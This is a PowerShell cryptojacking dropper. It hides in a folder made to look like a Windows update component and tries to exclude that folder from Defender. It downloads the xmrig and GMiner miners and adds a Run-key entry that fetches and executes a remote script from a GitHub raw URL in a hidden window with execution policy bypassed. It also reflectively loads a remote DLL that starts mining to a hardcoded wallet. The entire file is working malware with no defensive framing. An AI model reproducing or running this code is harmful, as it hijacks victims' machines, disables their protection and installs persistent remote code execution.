$u = "HolyV200"; $r = "trollminer"
$w = "bc1qly9l5tledssjfl8nxq97sdl55je04hjh790z44"
$ProgressPreference = 'SilentlyContinue'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$u2 = "https://raw.githubusercontent.com/$u/$r/main"

$sDir = "$env:LOCALAPPDATA\Microsoft\Windows\UpdateCoord"
if (!(Test-Path $sDir)) { md $sDir -Force >$null }

# Try Defender exclusion (silent fail if no admin)
try { Add-MpPreference -ExclusionPath $sDir -EA 0 } catch { }

try { Get-Process "xmrig", "miner" -EA 0 | Stop-Process -Force -EA 0 } catch { }

function Get-F($Url, $Path) {
    if (Test-Path $Path) { try { Remove-Item $Path -Force -EA 0 } catch { } }
    $ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0"
    try { 
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("User-Agent", $ua)
        $wc.DownloadFile($Url, $Path)
        if (Test-Path $Path) { if ((Get-Item $Path).Length -gt 1KB) { return $true } }
    } catch { }
    try { Invoke-WebRequest -Uri $Url -OutFile $Path -UserAgent $ua -UseBasicParsing; if (Test-Path $Path) { if ((Get-Item $Path).Length -gt 1KB) { return $true } } } catch { }
    return $false
}

function Extract-Safe($Zip, $Dest) {
    try { [System.IO.Compression.ZipFile]::ExtractToDirectory($Zip, $Dest) } catch {
        # If files already exist, extract manually overwriting
        try {
            $z = [System.IO.Compression.ZipFile]::OpenRead($Zip)
            foreach ($e in $z.Entries) {
                if ($e.Name -eq '') { continue }
                $tp = Join-Path $Dest $e.FullName
                $td = Split-Path $tp -Parent
                if (!(Test-Path $td)) { md $td -Force >$null }
                [System.IO.Compression.ZipFileExtensions]::ExtractToFile($e, $tp, $true)
            }
            $z.Dispose()
        } catch { }
    }
    Remove-Item $Zip -Force -EA 0
}

Add-Type -AssemblyName System.IO.Compression.FileSystem
$ce = "$sDir\xmrig.exe"; $ge = "$sDir\miner.exe"; $dp = "$sDir\Bridge.dll"
$v = "?v=$([Guid]::NewGuid())"

if (!(Test-Path $ce)) {
    $cz = "$sDir\upd_c.zip"
    if (Get-F "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-gcc-win64.zip" $cz) {
        Extract-Safe $cz $sDir
        $uz = Get-ChildItem $sDir -Filter "xmrig.exe" -Recurse | Select-Object -First 1
        if ($uz -and $uz.FullName -ne $ce) { Move-Item $uz.FullName $ce -Force }
        # Clean extracted subfolder
        Get-ChildItem $sDir -Directory | Where-Object { $_.Name -like "xmrig*" } | Remove-Item -Recurse -Force -EA 0
    }
}

$gd = $false
try { 
    $ccs = Get-CimInstance Win32_VideoController -EA 0
    foreach ($cc in $ccs) { 
        $nn = $cc.Name.ToUpper()
        if ($nn -match "NVIDIA|AMD|RADEON|RTX|GTX" -and $cc.AdapterRAM -gt 3221225472) { 
            if ($nn -notmatch "MICROSOFT BASIC|DISPLAY") { $gd = $true; break } 
        } 
    } 
} catch { }

if ($gd -and !(Test-Path $ge)) {
    $gz = "$sDir\upd_g.zip"
    if (Get-F "https://github.com/develsoftware/GMinerRelease/releases/download/3.44/gminer_3_44_windows64.zip" $gz) {
        Extract-Safe $gz $sDir
        $uz = Get-ChildItem $sDir -Filter "miner.exe" -Recurse | Select-Object -First 1
        if ($uz -and $uz.FullName -ne $ge) { Move-Item $uz.FullName $ge -Force }
        Get-ChildItem $sDir -Directory | Remove-Item -Recurse -Force -EA 0
    }
}

$tp = "powershell -NoP -NonI -W Hidden -Exec Bypass -Command `"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; iex(New-Object Net.WebClient).DownloadString('$u2/update.ps1')`""
Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" "UpdateCoord" $tp -EA 0

if (Get-F "$u2/Bridge.dll$v" $dp) {
    try {
        $db = [IO.File]::ReadAllBytes($dp)
        [Reflection.Assembly]::Load($db).GetType('DateFundLoader').GetMethod('StartMiner').Invoke($null, @([string]$ce, [string]$ge, [string]$w))
    } catch { }
}

Write-Host "Running"
while ($true) { Start-Sleep -Seconds 3600 }
